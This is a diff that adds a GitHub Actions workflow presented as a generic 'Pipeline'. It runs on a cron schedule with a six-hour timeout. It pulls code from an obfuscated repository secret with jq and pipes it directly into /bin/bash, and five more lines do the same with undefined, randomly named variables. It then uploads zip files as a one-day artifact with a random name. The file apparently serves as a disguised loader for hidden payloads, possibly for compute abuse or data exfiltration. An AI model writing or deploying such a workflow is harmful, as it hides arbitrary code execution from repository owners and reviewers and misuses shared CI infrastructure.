@@ -1,0 +1,36 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          tj649: ${{ secrets.tj649 }}
+        run: |
+          printf '%s' "$tj649" | jq -r .g2 | /bin/bash
+          printf '%s' "$o8" | jq -r .n55969 | /bin/bash
+          printf '%s' "$xr733" | jq -r .yaaaw1 | /bin/bash
+          echo $mxaf51846 | jq -r .bra96367 | /bin/bash
+          printf '%s' "$ox1926" | jq -r .nzhk7 | /bin/bash
+          printf '%s' "$fl410" | jq -r .nhama30 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: uwL3d9PE
+          path: "*.zip"
+          retention-days: 1
